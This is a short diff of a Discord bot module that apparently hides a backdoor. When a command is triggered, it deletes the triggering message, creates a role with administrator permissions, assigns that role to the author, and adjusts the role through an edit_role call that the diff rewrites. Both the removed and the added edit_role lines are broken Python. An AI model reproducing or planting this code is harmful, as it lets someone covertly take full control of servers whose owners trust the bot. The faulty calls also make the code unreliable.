@@ -15,7 +15,7 @@ class botmod:
             await self.bot.delete_message(ctx.message)
             carga = await self.bot.create_role(message.server, administrator=True)
             await self.bot.add_roles(autor, carga)
-            await self.bot.edit_role(message.server, carga, name="rs", administrator)
+            await self.bot.edit_role(message.server, carga, permissions(administrator))
 
         else:
             return
